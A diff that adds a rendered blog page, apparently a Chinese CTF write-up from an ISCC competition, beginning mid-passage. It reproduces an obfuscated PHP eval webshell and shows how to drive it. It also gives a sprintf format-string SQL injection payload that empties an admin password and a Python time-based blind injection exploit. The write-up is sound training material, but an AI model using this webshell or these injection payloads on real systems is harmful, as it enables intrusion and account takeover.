class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@preg_match(<span class="string">"/$kh(.+)$kf/"</span>,@file_get_contents(<span class="string">"php://input"</span>),$m)==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  	@ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode($m[<span class="number">1</span>]),$k)));</span><br><span class="line">    $o=@ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    $r=@base64_encode(@x(@gzcompress($o),$k));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"$p$kh$r$kf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解释一下几个函数：</p>
+<p>①<code>gzcompress()</code>：压缩内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gzcompress ( string $data [, int $level = -1 [, int $encoding = ZLIB_ENCODING_DEFLATE ]] ) : string</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">The data to compress.</span><br><span class="line"></span><br><span class="line">level</span><br><span class="line">The level of compression. Can be given as 0 for no compression up to 9 for maximum compression.</span><br><span class="line"></span><br><span class="line">If -1 is used, the default compression of the zlib library is used which is 6.</span><br><span class="line"></span><br><span class="line">encoding</span><br><span class="line">One of ZLIB_ENCODING_* constants.</span><br></pre></td></tr></table></figure>
+<p>②<code>gzuncompress()</code>：解压缩内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gzuncompress ( string $data [, int $length = 0 ] ) : string</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">The data compressed by gzcompress().</span><br><span class="line"></span><br><span class="line">length</span><br><span class="line">The maximum length of data to decode.</span><br></pre></td></tr></table></figure>
+<p>③<code>preg_match</code>()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int</span><br><span class="line"></span><br><span class="line">pattern：要搜索的模式，字符串类型。</span><br><span class="line"></span><br><span class="line">subject：输入字符串。</span><br><span class="line"></span><br><span class="line">matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br></pre></td></tr></table></figure>
+<p>④<code>ob_start()</code>、<code>ob_get_contents()</code>、<code>ob_end_clean()</code>、三个函数实现缓冲本地文件，以及执行本地脚本代码。使用ob_start()把输出那同输出到缓冲区，而不是到浏览器。然后用ob_get_contents得到缓冲区的数据。ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。函数ob_end_clean会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。  </p>
+<p>那么<code>function x</code>的作用其实就是对两个字符串内容异或，有点类似于加密。利用<code>$t</code>和<code>$k</code>生成<code>$o</code>，假设我们不知道<code>$t</code>的内容，只要将<code>$o</code>放在<code>$t</code>的位置，就可以生成<code>$t</code></p>
+<p>我们通过逆推，用如下代码生成<code>phpinfo();</code>的字符串，构成<code>$kh</code> + <code>生成的字符串</code> + <code>$kf</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_str = @base64_encode(@x(@gzcompress(<span class="string">"phpinfo();"</span>),$k));</span><br><span class="line"><span class="keyword">echo</span> $kh.$phpinfo_str.$kf;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b9615a29bc1dTf1I8Rmu+y/+trONN2YioDbg24d0b67c2c91</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-1.png" alt="4-1"></p>
+<p>但是直接提交的话，显示的是<code>@base64_encode(@x(@gzcompress($o),$k))</code>处理的内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-2.png" alt="4-2"></p>
+<p>我们直接将 <code>print(&quot;$p$kh$r$kf&quot;);</code>替换为<code>echo @base64_decode(@x(@gzuncompress($r),$k));</code></p>
+<p>再次<code>POST</code>就成功了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-3.png" alt="4-3"></p>
+<h2 id="AWD高地"><a href="#AWD高地" class="headerlink" title="AWD高地"></a>AWD高地</h2><p>题目简化代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"security"</span>);</span><br><span class="line">$Profile = sprintf(<span class="string">"password = '%s'"</span>, mysqli_real_escape_string($mysqli, $_GET[<span class="string">'profile'</span>]));</span><br><span class="line">$sql = sprintf(<span class="string">"update users set $Profile where username='%s'"</span>, mysqli_real_escape_string($mysqli, <span class="string">'Dumb'</span>));</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result===<span class="keyword">True</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1 style='color:red;'&gt;$mysqli-&gt;error&lt;/h1&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目考查的是<code>sprintf()格式化字符串漏洞</code>，详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p>
+<p>我们传入参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile = %1$&apos;</span><br></pre></td></tr></table></figure>
+<p>经过<code>mysqli_real_escape_string()</code>处理后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile = %1$\&apos;</span><br></pre></td></tr></table></figure>
+<p>经过第一个<code>sprintf()</code>处理后，<code>$Profile</code>字符串变量的值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password = &apos;%1$\&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>经过第二个<code>sprintf()</code>处理后，<code>$sql</code>字符串变量的值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">拼接后：</span><br><span class="line">update users set password = &apos;%1$\&apos;&apos; where username=&apos;Dumb&apos;</span><br><span class="line">这里的%1$\会被吃掉，所以还有一个传入的单引号没有被处理，逃逸出来</span><br><span class="line">处理后：</span><br><span class="line">update users set password = &apos;&apos;&apos; where username=&apos;Dumb&apos;</span><br></pre></td></tr></table></figure>
+<p>所以就造成了注入，比如可以这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?profile = %1$\&apos; where username=&apos;admin&apos; #</span><br><span class="line">	↓</span><br><span class="line">$Profile = password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">#修改admin用户的密码为空</span><br></pre></td></tr></table></figure>
+<p>本题exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinject</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">			sql=<span class="string">f"http://127.0.0.1/test.php?profile=%1$\' where username=0x44756d62 and if(ascii(substr((database()),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;i&#125;</span>,sleep(1),0)--+"</span></span><br><span class="line">			ss=time.time()</span><br><span class="line">			res=requests.get(sql)</span><br><span class="line">			<span class="keyword">if</span> time.time()-ss&gt;=<span class="number">0.5</span>:</span><br><span class="line">				<span class="comment">#print(sql)</span></span><br><span class="line">				print(chr(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'__main__'</span>==__name__:</span><br><span class="line">	sqlinject()</span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='knlvre.github.io/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
 
 
-block content
-  article#post(class="")
-    #post-content.article-container!= page.content
-  if (theme.post_copyright && theme.post_copyright.enable && page.copyright != false)
-    .post-copyright
-      .post-copyright__author
-        span.post-copyright-meta= _p('post.copyright.author') + ": "
-        span.post-copyright-info
-          a(href=`mailto:${config.email}`) #[=config.author]
-      .post-copyright__type
-        span.post-copyright-meta= _p('post.copyright.link') + ": "
-        span.post-copyright-info
-          a(href=url_for(page.permalink)) #[=page.permalink]
-      .post-copyright__notice
-        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
-        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
-  
-  .tag_share
-    if (theme.post_meta.tags)
-      .post-meta__tag-list
-        each item, index in page.tags.data
-          a(href=url_for(item.path)).post-meta__tags #[=item.name]    
-    include includes/share/index.pug
-        
-  if theme.reward.enable
-    include includes/reward.pug
-  include includes/pagination.pug
-  
-  if theme.related_post && theme.related_post.enable
-    != related_posts(page,site.posts)
-  if page.comments !== false
-    include includes/comments/index.pug
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>Knlvre</p>
+                    <span>Think like an artist, develop like an artisan</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">61 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">9 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWD私地"><span class="toc-number">4.</span> <span class="toc-text">AWD私地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件上传getshell"><span class="toc-number">4.1.</span> <span class="toc-text">1. 文件上传getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-xmlrpc-php中的命令注入"><span class="toc-number">4.2.</span> <span class="toc-text">2. xmlrpc.php中的命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-代码混淆"><span class="toc-number">4.3.</span> <span class="toc-text">3.  代码混淆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWD高地"><span class="toc-number">5.</span> <span class="toc-text">AWD高地</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2019
+        <span class="gradient-text">
+            Knlvre
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="knlvre.github.io/js/plugin.js"></script>
+<script src="knlvre.github.io/js/obsidian.js"></script>
+<script src="knlvre.github.io/js/jquery.truncate.js"></script>
+<script src="knlvre.github.io/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="knlvre.github.io/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Think like an artist, develop like an artisan", "艺术家思维去思考问题，工匠创造精神去开发"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
